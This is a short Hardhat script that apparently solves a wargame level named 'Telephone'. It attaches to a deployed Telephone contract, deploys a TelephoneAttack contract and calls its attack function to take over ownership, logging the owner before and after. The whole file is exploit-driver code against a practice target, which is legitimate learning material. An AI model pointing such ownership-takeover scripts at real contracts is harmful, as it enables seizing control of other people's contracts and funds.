import { ethers } from "hardhat";
import { Telephone__factory } from "../typechain/factories/contracts/Telephone__factory";
import { TelephoneAttack__factory } from "../typechain/factories/contracts/TelephoneAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x5C8b1988dBBD945F8E698164777B29ECdBeb794c";
    let telephone = new Telephone__factory(signer).attach(instance_address);
    console.log(await telephone.owner());


    let attack = await new TelephoneAttack__factory(signer).deploy();
    await attack.deployed();

    let tx = await attack.attack(instance_address);
    await tx.wait();
    console.log(await telephone.owner());
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
